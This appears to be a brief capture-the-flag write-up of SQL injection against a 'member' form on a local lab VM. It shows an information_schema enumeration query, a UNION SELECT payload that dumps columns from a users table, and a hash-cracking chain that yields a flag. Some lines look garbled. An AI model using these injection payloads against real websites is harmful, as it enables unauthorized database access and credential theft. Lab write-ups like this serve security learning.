We have a form to fill at the page "http://192.168.56.102/?page=member".

It looks like backend use the input from it right in an SQL statement. So we can use it for an "injection".

Let's take a look on schema:

SELECT table_name, column_name FROM information_schema.columns

Now we know all the columns and names:


Let's see what is inside the hidden columns:

1 AND 1=2 UNION SELECT planet
, CONCAT(Commentaire, countersign) FROM users;




5ff9d0165b4f92b14994e5c685cdce28 >> md5 >> FortyTwo >> lower() >> sh256 >> 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
